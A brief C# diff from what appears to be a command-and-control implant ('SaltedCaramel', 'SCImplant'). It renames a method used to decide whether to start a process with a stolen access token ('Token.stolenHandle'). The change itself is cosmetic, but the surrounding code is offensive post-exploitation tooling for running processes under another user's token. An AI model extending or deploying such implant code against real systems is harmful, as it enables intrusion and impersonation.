@@ -17,7 +17,7 @@ namespace SaltedCaramel.Tasks
         // Otherwise, we can use Process.Start
         public static void Execute(SCTaskObject task, SCImplant implant)
         {
-            if (implant.hasAlternateToken() == true)
+            if (implant.HasAlternateToken() == true)
                 StartProcessWithToken(task, implant, Token.stolenHandle);
             else
                StartProcess(task, implant);
